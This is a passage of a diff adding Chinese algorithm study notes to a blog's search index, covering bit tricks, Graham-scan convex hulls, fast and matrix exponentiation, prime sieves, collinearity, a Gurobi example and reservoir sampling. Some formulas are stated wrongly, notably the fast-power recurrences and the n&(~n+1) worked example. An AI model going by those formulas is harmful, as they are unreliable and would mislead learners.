@@ -1,6 +1,651 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Brian Kernighan Algorithm</title>
+    <url>/2022/05/25/Algorithm/Brian-Kernighan-Algorithm/</url>
+    <content><![CDATA[<h1 id="Brian-Kernighan-Algorithm"><a href="#Brian-Kernighan-Algorithm" class="headerlink" title="Brian Kernighan Algorithm"></a>Brian Kernighan Algorithm</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>通过一定的位运算取到二进制数据的相应位</p>
+<ol>
+<li><p>$n\&amp;(n-1)$ 将数据二进制最右的 1 变为 0 </p>
+<p>例如：$n = 11_{(10)} = 1011_{(2)}, n\&amp;(n-1) = 1011 \&amp; 1010 = 1010_{(2)} = 10_{(10)}$</p>
+</li>
+<li><p>$n\&amp;(~n+1)$ 提取数据二进制最后一个 1 到结尾的数据</p>
+<p>例如：$n = 14_{(10)} = 1110_{(2)}, n\&amp;(~n+1) = 1110 \&amp; 0001 + 00001 = 1110 \&amp; 0010 = 0010_{(2)} = 2_{(10)}$</p>
+</li>
+</ol>
+<p>可以测试一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = random.randint(<span class="number">0</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(n,<span class="built_in">bin</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(n−1):&#x27;</span>,n&amp;(n-<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(n-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(~n+1):&#x27;</span>,n&amp;(~n+<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(~n+<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
+<h2 id="example："><a href="#example：" class="headerlink" title="example："></a>example：</h2><p><a href="https://leetcode.cn/problems/number-of-1-bits/">191. 位1的个数</a></p>
+]]></content>
+      <categories>
+        <category>Code_Algo</category>
+      </categories>
+      <tags>
+        <tag>Math,Binary</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>凸包算法</title>
+    <url>/2022/05/25/Algorithm/%E5%87%B8%E5%8C%85%E7%AE%97%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="凸包算法"><a href="#凸包算法" class="headerlink" title="凸包算法"></a>凸包算法</h2><p># 待补充：Jarvis，Andrew </p>
+<p>感谢<a href="https://blog.csdn.net/KnightHONG/article/details/101860288">凸包算法详解(Graham扫描法)</a>，由<a href="https://leetcode-cn.com/problems/erect-the-fence/">leetcode 587. 安装栅栏</a> 而来。</p>
+<p>理解凸包算法之前需要理解以下几个概念：</p>
+<ol>
+<li>向量积</li>
+<li>Jarvis算法</li>
+<li>Graham扫描，及极角排序</li>
+<li>Andrew 算法</li>
+</ol>
+<h3 id="向量积"><a href="#向量积" class="headerlink" title="向量积"></a>向量积</h3><p>在高等数学中，向量的运算包括数量积和向量积：</p>
+<p>*数量积，又叫点乘，定义是</p>
+<script type="math/tex; mode=display">
+\vec{a}=[a_1,a_2,...,a_n]\;and\;\vec{b}=[b_1,b_2,...,b_n]\\
+\vec{a} \cdot \vec{b}=\sum_{i\in{(1,n)}}{a_ib_i}</script><p>理解为对应位相乘再相加，如果向量为布尔向量，则乘操作变为 $AND$ 加操作变为 $XOR$ 。</p>
+<p>也可以表示为：</p>
+<script type="math/tex; mode=display">
+\vec{a} \cdot \vec{b}=|\vec{a}||\vec{b}|\cos\theta</script><p>从矩阵的角度理解为 $\vec{a}\cdot\vec{b} = \vec{a}^T*\vec{b}$</p>
+<p>例如$\vec{a}=[1,2]^T,\vec{b}=[2,1]^T\;\;\rightarrow\;\;\vec{a}\cdot\vec{b} = 1<em>2+2</em>1=4$ 即点乘得到的是一个数</p>
+<p><strong>*向量积</strong>，又叫叉乘，定义为（二维表示）</p>
+<script type="math/tex; mode=display">
+{\displaystyle \mathbf {\vec{a}} \times \mathbf {\vec{b}} =\|\mathbf {\vec{a}} \|*\|\mathbf {\vec{b}} \|\sin(\theta )\ \mathbf {n} }</script><p>$|\mathbf {a} |\;and\;|\mathbf {b} |$表示向量的模长，$\sin(\theta )$ 是两个向量在其所定义的平面上的夹角，$n$ 为 $\mathbf {\vec{a}} \;and\; \mathbf {\vec{b}}$ 所构成平面上的单位向量，$n$ 的方向根据右手定则判断（从 $\vec{a}$ 到 $\vec{b}$ 弯转四指，大拇指所指方向即为叉乘所得向量方向）所有向量积得到的是一个垂直于由 $\mathbf {\vec{a}} \;and\; \mathbf {\vec{b}}$ 所构成平面的向量，与 $\mathbf {\vec{a}} \;and\; \mathbf {\vec{b}}$ 所构成平面的法向量平行，<strong>如果与法向量同向，则结果取正，否则结果取负</strong>。也可以理解为与法向量反向时，由 $\mathbf {\vec{a}} \times \mathbf {\vec{b}}$ 变成了 $\mathbf {\vec{b}} \times \mathbf {\vec{a}}$ ，所以 $\mathbf {\vec{a}} \times \mathbf {\vec{b}} = -\mathbf {\vec{b}} \times \mathbf {\vec{a}}$ 或者也可表示为取模的形式，得到一个数字而非向量：</p>
+<script type="math/tex; mode=display">
+{\displaystyle |\mathbf {\vec{a}} \times \mathbf {\vec{b}}| =\|\mathbf {\vec{a}} \|*\|\mathbf {\vec{b}} \|\sin(\theta )}=(a_1*b_2)-(a_2*b_1)</script><p><img src="https://img-blog.csdnimg.cn/20191002101207446.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tuaWdodEhPTkc=,size_16,color_FFFFFF,t_70" alt="img"></p>
+<h3 id="Graham"><a href="#Graham" class="headerlink" title="Graham"></a>Graham</h3><h4 id="极角排序"><a href="#极角排序" class="headerlink" title="极角排序"></a>极角排序</h4><p>我们知道，二维平面上一个向量可以由一个点来表示，如：</p>
+<center>
+    <img src="https://img-blog.csdnimg.cn/20191001210234595.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tuaWdodEhPTkc=,size_8,color_FFFFFF,t_70" alt="img" style="zoom:50%;" />
+</center>
+
+<p>其中用点表示为 $p1,p2,p3…$ 用向量表示为 $\mathop{p0p1}\limits ^{\rightarrow},\vec{p0p2}…$ （注意这里把 $p0$ 看作原点）</p>
+<p>要将以上的各个向量排序，当然不能仅依赖其坐标，那么很自然的考虑到其与坐标轴的夹角，这里以 x 轴正半轴为基准轴，将向量按照与其夹角由小到大排序，那么顺序就是 $\mathop{p0p1}\limits ^{\rightarrow},\vec{p0p2}…\vec{p0p8}$  </p>
+<p>做好极角排序的准备工作之后，就可以开始开始凸包算法的<strong>Graham扫描</strong>了。</p>
+<h4 id="Graham扫描"><a href="#Graham扫描" class="headerlink" title="Graham扫描"></a>Graham扫描</h4><p>所谓 Graham 扫描，即寻找最外层能够将所有点包含住的一条封闭线，例如：</p>
+<center>
+    <img src="https://img-blog.csdnimg.cn/20191001212355831.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tuaWdodEhPTkc=,size_16,color_FFFFFF,t_70" width="60%">
+</center>
+
+<p>开始扫描，是将原点 $p0$ 与排序后的第一个顶点  $p1$ 相连得到向量 $\vec{p0p1}$，然后再将  $p1$ 与排序得到的下一个顶点相连，得到 $\vec{p1p2}$，此时需要进行一次判断：</p>
+<ul>
+<li><p>新加入的点和其与前一个点构成的向量是否为向左偏转（相对于前一条向量）如果是，则该点可能是构成凸包的最外层顶点；</p>
+</li>
+<li><p>否则，即新加入的点和其与前一个点构成的向量向右偏转（相对于前一条向量），则前面加入的点可能由于新加入了该点而不在外层顶点，换成新加入的点为构成凸包的最外层顶点。</p>
+</li>
+</ul>
+<p>以上图举例：</p>
+<p>加入 $p0p1$ 为第一条向量（$p1$ 纳入最外层顶点集），加入 $p1p2$ 为第二条向量（$p2$ 纳入最外层顶点集），此时根据图形判断，相对于第一条向量为向左偏转，加入 $p2p3$ 为第三条向量，判断 $p2p3$ 相对于 $p1p2$ 为向右偏转，则删除点 $p2$ 而将 $p3$ 纳入最外层顶点集…以此类推</p>
+<p>那么如何用数学语言判断向量是向哪个方向偏转呢？——向量积，如下图，顶点记 $a=(0,0)$ ，两个向量顶点 $b=(2,3)\;and\;c=(1,5)\;or\;(5,3)$ ：</p>
+<p>左图 $\vec{ab(=(2,3))}\times\vec{ac(=(1,5))}=2<em>5-3</em>1=7&gt;0$ ，即向左偏；</p>
+<p>右图 $\vec{ab(=(2,3))}\times\vec{ac(=(5,3))}=2<em>3-3</em>5=-9&lt;0$，即向右偏；</p>
+<center>
+    <img src="https://uploadfiles.nowcoder.com/images/20220423/629760107_1650711275955/6FB53C51539B47559CF0D122A832CF63" width="50%"><img src="https://uploadfiles.nowcoder.com/images/20220423/629760107_1650711275950/FE88E01440218FA643954E80A16BEDBB" width="50%">
+</center>
+
+
+<p>很明显，通过上面对向量积的描述可以推断出当绿色向量相对于蓝色向量向左偏转时叉乘结果为正，向右则为负。</p>
+<p>经过对所有顶点的依照条件：</p>
+<ol>
+<li>将各个坐标依极角排序</li>
+<li>新加入点构成的向量较前一条向量向左偏转（叉乘为正）</li>
+<li>将满足条件的点留在凸包顶点集，不满足的剔除</li>
+</ol>
+<p>就得到了一系列顶点的凸包，此即为使用Graham扫描的凸包算法的基本思想。</p>
+<p>C语言代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Jarvis"><a href="#Jarvis" class="headerlink" title="Jarvis"></a>Jarvis</h3><h3 id="Andrew"><a href="#Andrew" class="headerlink" title="Andrew"></a>Andrew</h3>]]></content>
+      <categories>
+        <category>Code_Algo</category>
+      </categories>
+      <tags>
+        <tag>Math</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>矩阵快速幂</title>
+    <url>/2022/05/25/Algorithm/%E7%9F%A9%E9%98%B5%E5%BF%AB%E9%80%9F%E5%B9%82/</url>
+    <content><![CDATA[<h1 id="矩阵快速幂"><a href="#矩阵快速幂" class="headerlink" title="矩阵快速幂"></a><strong>矩阵快速幂</strong></h1><h2 id="整数快速幂"><a href="#整数快速幂" class="headerlink" title="整数快速幂"></a>整数快速幂</h2><p>解释：计算模幂运算时，可用的规则有：</p>
+<script type="math/tex; mode=display">
+(a+b)\%m=(a\%m+b\%m)\%m\\
+(a*b)\%m=(a\%m*b\%m)\%m</script><p>求幂次时可用将幂次拆分，如 $a^{b}$，</p>
+<ul>
+<li>b 为奇数时， $a^{b} = a^{b-1}*a^b$</li>
+<li>b 为偶数时， $a^{b} = (a^2)^{b-1}$</li>
+</ul>
+<p>一般是在取模的情况下快速幂，否则会数据过大</p>
+<p>例：求 $a^{b}\  \% \ c$</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">b = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># a^b%c</span></span><br><span class="line">res = <span class="number">1</span>	<span class="comment">#初始为为单位元</span></span><br><span class="line"><span class="keyword">while</span> b&gt;<span class="number">0</span>:</span><br><span class="line">  <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">    res = (res * a) % c</span><br><span class="line">  a = a*a</span><br><span class="line">  b &gt;&gt;= <span class="number">1</span> <span class="comment"># == b//2</span></span><br><span class="line">  <span class="comment">#print(a,b,res)</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+<h2 id="矩阵快速幂-1"><a href="#矩阵快速幂-1" class="headerlink" title="矩阵快速幂"></a>矩阵快速幂</h2><p>矩阵快速幂和整数快速幂原理相同，要求矩阵是方阵，以求斐波那契数列为例：</p>
+<script type="math/tex; mode=display">
+\left[\begin{array}{ll}
+1 & 1 \\
+1 & 0
+\end{array}\right]\left[\begin{array}{c}
+F(n) \\
+F(n-1)
+\end{array}\right]=\left[\begin{array}{c}
+F(n)+F(n-1) \\
+F(n)
+\end{array}\right]=\left[\begin{array}{c}
+F(n+1) \\
+F(n)
+\end{array}\right]</script><p>因此：</p>
+<script type="math/tex; mode=display">
+\left[ \begin{matrix} F(n + 1)\\ F(n) \end{matrix} \right] = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right] ^n \left[ \begin{matrix} F(1)\\ F(0) \end{matrix} \right]</script><p>令：</p>
+<script type="math/tex; mode=display">
+M = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right]</script><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">multiply_matrix</span>(<span class="params">a,b</span>):</span><br><span class="line">            <span class="comment">#a,b = matrix</span></span><br><span class="line">            <span class="comment">#return matrix</span></span><br><span class="line">            c=[[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    c[i][j] = (a[i][<span class="number">0</span>]*b[<span class="number">0</span>][j] + a[i][<span class="number">1</span>]*b[<span class="number">1</span>][j]) % <span class="number">1000000007</span></span><br><span class="line">                    <span class="built_in">print</span>(c)</span><br><span class="line">            <span class="keyword">return</span> c</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">pow_matrix</span>(<span class="params">a,n</span>):</span><br><span class="line">            <span class="comment">#初始化为单位阵，不会影响初始运算</span></span><br><span class="line">            res = [[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>]] </span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> n &amp; <span class="number">1</span>:</span><br><span class="line">                    res = multiply_matrix(res,a)</span><br><span class="line">                n &gt;&gt;= <span class="number">1</span>  <span class="comment">#右移一位相当于 ceil(n//2)</span></span><br><span class="line">                a = multiply_matrix(a,a)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        ans = pow_matrix([[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>]],n-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> ans[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Code_Algo</category>
+      </categories>
+      <tags>
+        <tag>Math</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>素数筛</title>
+    <url>/2022/05/25/Algorithm/%E7%B4%A0%E6%95%B0%E7%AD%9B/</url>
+    <content><![CDATA[<h1 id="素数筛"><a href="#素数筛" class="headerlink" title="素数筛"></a>素数筛</h1><h2 id="艾氏筛"><a href="#艾氏筛" class="headerlink" title="艾氏筛"></a>艾氏筛</h2><p>筛出小于 n 的所有素数</p>
+<ol>
+<li>建立数组记录每个值是否为素数，初始化全是素数；</li>
+<li>遍历数组（<strong>遍历到 sqrt(n) 就够了</strong>），将当前值 i 的倍数全部划为合数类；</li>
+<li>得到一个划分和素数与合数的数组</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">countPrimes</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        isPrime = [<span class="number">1</span>] * n</span><br><span class="line">        isPrime[<span class="number">0</span>] = isPrime[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(n ** <span class="number">0.5</span>) + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> isPrime[i]:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i*i,n,i):</span><br><span class="line">                    isPrime[j] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>(isPrime)</span><br></pre></td></tr></table></figure>
+<p>例子： <a href="https://leetcode.cn/problems/count-primes/">204. 计数质数</a></p>
+]]></content>
+      <categories>
+        <category>Code_Algo</category>
+      </categories>
+      <tags>
+        <tag>Math</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何判断三点是否共线？</title>
+    <url>/2022/06/09/Algorithm/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%B8%89%E7%82%B9%E6%98%AF%E5%90%A6%E5%85%B1%E7%BA%BF%EF%BC%9F/</url>
+    <content><![CDATA[<h2 id="判断三点共线"><a href="#判断三点共线" class="headerlink" title="判断三点共线"></a>判断三点共线</h2><p>判断三点是否共线，有三种方法（其实实质上是两种）</p>
+<p>点 $(x_1,y_1),(x_2,y_2),(x_3,y_3)$ </p>
+<h3 id="1-计算斜率"><a href="#1-计算斜率" class="headerlink" title="1. 计算斜率"></a>1. 计算斜率</h3><p>明显，如果三点组成两条直线斜率相同，则共线：</p>
+<p>判断条件：</p>
+<script type="math/tex; mode=display">
+(y_2-y_1)/(x_2-x_1) \overset{?}{=} (y_3-y_1)/(x_3-x_1)</script><p>如果分母存在 0 ，就不能够计算了。所有可以把上式转换为乘法（也就是向量叉乘）</p>
+<h3 id="2-向量叉乘"><a href="#2-向量叉乘" class="headerlink" title="2. 向量叉乘"></a>2. 向量叉乘</h3><script type="math/tex; mode=display">
+|\overset{\rightarrow}{a}\times\overset{\rightarrow}{b}| = |\overset{\rightarrow}{a}|*|\overset{\rightarrow}{b}|*sin\theta=(y_3−y_1) * (x_2−x_1) − (y_2−y_1) * (x_3−x_1)</script><p>如果共线，结果为 0 </p>
+<h3 id="3-三角形面积"><a href="#3-三角形面积" class="headerlink" title="3. 三角形面积"></a>3. 三角形面积</h3><p>如果三点共线，面积自然为 0 </p>
+<script type="math/tex; mode=display">
+S=\frac{1}{2}\left|\begin{array}{lll}
+x 1 & y 1 & 1 \\
+x 2 & y 2 & 1 \\
+x 3 & y 3 & 1
+\end{array}\right|\\
+=(x_1*y_2 + x_2*y_3 + x_3*y_1 - x_1*y_3 - x_2*y_1 - x_3*y_2)</script><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="1037-Valid-Boomerang"><a href="#1037-Valid-Boomerang" class="headerlink" title="1037. Valid Boomerang"></a><a href="https://leetcode.cn/problems/valid-boomerang/">1037. Valid Boomerang</a></h4><p>Given an array <code>points</code> where <code>points[i] = [xi, yi]</code> represents a point on the <strong>X-Y</strong> plane, return <code>true</code> <em>if these points are a <strong>boomerang</strong></em>.</p>
+<p>A <strong>boomerang</strong> is a set of three points that are <strong>all distinct</strong> and <strong>not in a straight line</strong>.</p>
+<p><strong>Example 1:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: points = [[1,1],[2,3],[3,2]]</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
+<p><strong>Example 2:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: points = [[1,1],[2,2],[3,3]]</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
+<p><strong>Constraints:</strong></p>
+<ul>
+<li><code>points.length == 3</code></li>
+<li><code>points[i].length == 2</code></li>
+<li><code>0 &lt;= xi, yi &lt;= 100</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isBoomerang</span>(<span class="params">self, points: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">#斜率，但不能保证没有 0 </span></span><br><span class="line">        <span class="comment">#return (points[1][1]-points[0][1])/(points[1][0]-points[0][0]) != (points[2][1]-points[0][1])/(points[2][0]-points[0][0])</span></span><br><span class="line">        <span class="comment">#转换为 乘法求</span></span><br><span class="line">        <span class="keyword">return</span> (points[<span class="number">1</span>][<span class="number">0</span>]-points[<span class="number">0</span>][<span class="number">0</span>])*(points[<span class="number">2</span>][<span class="number">1</span>]-points[<span class="number">0</span>][<span class="number">1</span>]) != (points[<span class="number">1</span>][<span class="number">1</span>]-points[<span class="number">0</span>][<span class="number">1</span>])*(points[<span class="number">2</span>][<span class="number">0</span>]-points[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#三角形面积(如果三角形面积不为 0 则满足题意)</span></span><br><span class="line">        <span class="comment">#(x1*y2 + x2*y3 + x3*y1 - x1*y3 - x2*y1 - x3*y2)</span></span><br><span class="line">        <span class="comment">#return points[0][0]*points[1][1] + points[1][0]*points[2][1] + points[2][0]*points[0][1] - points[0][0]*points[2][1] - points[1][0]*points[0][1] - points[2][0]*points[1][1] != 0</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Code_Algo</category>
+      </categories>
+      <tags>
+        <tag>Math,Binary</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gurobi_1_ex_mip1</title>
+    <url>/2022/05/30/Gurobi/Gurobi-1-ex-mip1/</url>
+    <content><![CDATA[<h1 id="ex-mip1"><a href="#ex-mip1" class="headerlink" title="ex_mip1"></a>ex_mip1</h1><h2 id="求解问题"><a href="#求解问题" class="headerlink" title="求解问题"></a>求解问题</h2><script type="math/tex; mode=display">
+\begin{array}{cl}
+\max & x+y+2 z \\
+\text { s.t. } & x+2 y+3 z \leq 4 \\
+& x+y \geq 1 \\
+& x, y, z \in\{0,1\}
+\end{array}</script><h2 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gurobipy</span><br><span class="line"><span class="keyword">from</span> gurobipy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#需要对出错情况进行反馈，所以用 try</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#建一个模型</span></span><br><span class="line">    m = gurobipy.Model(<span class="string">&quot;mip1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Model=&#x27;</span>,m)   <span class="comment">#Model= &lt;gurobi.Model Continuous instance mip1: 0 constrs, 0 vars, No parameter changes&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义变量</span></span><br><span class="line">    x = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">    y = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;y&quot;</span>)</span><br><span class="line">    z = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;z&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#目标函数</span></span><br><span class="line">    m.setObjective(x+y+<span class="number">2</span>*z, GRB.MAXIMIZE)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#约束条件</span></span><br><span class="line">    m.addConstr(x+<span class="number">2</span>*y+<span class="number">3</span>*z &lt;= <span class="number">4</span>, <span class="string">&#x27;c0&#x27;</span>)</span><br><span class="line">    m.addConstr(x+y &gt;= <span class="number">1</span>, <span class="string">&#x27;c1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#优化模型</span></span><br><span class="line">    m.optimize()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;new_Model=&#x27;</span>, m)  <span class="comment">#new_Model= &lt;gurobi.Model MIP instance mip1: 2 constrs, 3 vars, No parameter changes&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> m.getVars():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s %g&#x27;</span> % (v.VarName, v.X))</span><br><span class="line">    <span class="comment">#x 1</span></span><br><span class="line">    <span class="comment">#y 0</span></span><br><span class="line">    <span class="comment">#z 1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Obj: %g&#x27;</span> % m.ObjVal) <span class="comment">#Obj: 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> gurobipy.GurobiError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error code &#x27;</span> + <span class="built_in">str</span>(e.errno) + <span class="string">&#x27;: &#x27;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Encountered an attribute error&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/WASEFADG/article/details/105261808">https://blog.csdn.net/WASEFADG/article/details/105261808</a></p>
+]]></content>
+      <categories>
+        <category>MILP_Learning</category>
+      </categories>
+      <tags>
+        <tag>Gurobi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>约瑟夫环</title>
+    <url>/2022/05/25/Algorithm/%E7%BA%A6%E7%91%9F%E5%A4%AB%E7%8E%AF/</url>
+    <content><![CDATA[<h1 id="约瑟夫环"><a href="#约瑟夫环" class="headerlink" title="约瑟夫环"></a>约瑟夫环</h1><p>参见：</p>
+<p> <a href="https://leetcode-cn.com/problems/find-the-winner-of-the-circular-game/">1823. 找出游戏的获胜者</a></p>
+<h4 id="剑指-Offer-62-圆圈中最后剩下的数字"><a href="#剑指-Offer-62-圆圈中最后剩下的数字" class="headerlink" title="剑指 Offer 62. 圆圈中最后剩下的数字"></a><a href="https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/">剑指 Offer 62. 圆圈中最后剩下的数字</a></h4>]]></content>
+      <categories>
+        <category>Code_Algo</category>
+      </categories>
+      <tags>
+        <tag>Math</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蓄水池采样</title>
+    <url>/2022/05/25/Algorithm/%E8%93%84%E6%B0%B4%E6%B1%A0%E7%AE%97%E6%B3%95/</url>
+    <content><![CDATA[<h1 id="蓄水池采样算法-Reservoir-Sampling"><a href="#蓄水池采样算法-Reservoir-Sampling" class="headerlink" title="蓄水池采样算法 (Reservoir Sampling)"></a>蓄水池采样算法 (Reservoir Sampling)</h1><p><a href="https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1">https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1</a></p>
+<p>假设有一个蓄水池，蓄水池里不断加水，问如何在每一时刻都能以相同概率采样到数据？当然还可能有很多别的理解方式，但都要求在数据量变化的情况下使得抽样的概率相等。</p>
+<p>具体例子：<a href="https://leetcode-cn.com/problems/random-pick-index/">398. 随机数索引</a></p>
+<p>当然，存在很多现有的函数能够实现随机采样，但归其根源，考虑用概率解决：</p>
+<h2 id="算法过程"><a href="#算法过程" class="headerlink" title="算法过程"></a>算法过程</h2><p>假设数据序列的规模为 $n$，需要采样的数量的为 $k$。</p>
+<p>首先构建一个可容纳 $k$ 个元素的数组，将序列的前 $k$ 个元素放入数组中。</p>
+<p>然后从第 $k+1$ 个元素开始，以 $k_n$ 的概率来决定该元素是否被替换到数组中（数组中的元素被替换的概率是相同的）。 当遍历完所有元素之后，数组中剩下的元素即为所需采取的样本。</p>
+<h2 id="证明过程"><a href="#证明过程" class="headerlink" title="证明过程"></a>证明过程</h2><p>也可以抽取的样本是 $1$，概率就变成 $\frac{1}{n}$ ，如下：</p>
+<p>当只有一个数据时，采样到的概率为 $1$ ；</p>
+<p>加入一个数据时，取到它的概率为 $\frac{1}{2}$，那么，取到第一个数据的概率也为  $\frac{1}{2}$；</p>
+<p>再加入一个数据，取到它的概率为 $\frac{1}{3}$，取到前两个数据的概率就应该发生变化，为 之前的概率*本次未被选中的概率，即$\frac{1}{2}\times(1-\frac{1}{3})=\frac{1}{3}$；</p>
+<p>以此类推…</p>
+<p>对于抽样 $k$ 个数据集：</p>
+<p>对于第 $i$ 个数$（i≤ki≤k）$。在 $k$ 步之前，被选中的概率为 $1$。当走到第 $k+1$ 步时，被第 $k+1$ 个元素构成的新集合替换的概率 = $k+1$ 个元素中选中前 $k$ 个的概率 <em> 前 $k$ 个中选一个替换的概率，即为 $\frac{k}{k+1}</em>\frac{1}{k}=\frac{1}{k+1}$。则被保留的概率为 $1-\frac{1}{k+1}=\frac{k}{k+1}$。以此类推，则运行到第 $n$ 步时，被保留的概率 = 被选中的概率 * 不被替换的概率，即：</p>
+<script type="math/tex; mode=display">
+1\times\frac{k}{k+1}\times\frac{k+1}{k+2}\times...\times\frac{n-1}{n}=\frac{k}{n}\\
+or\\
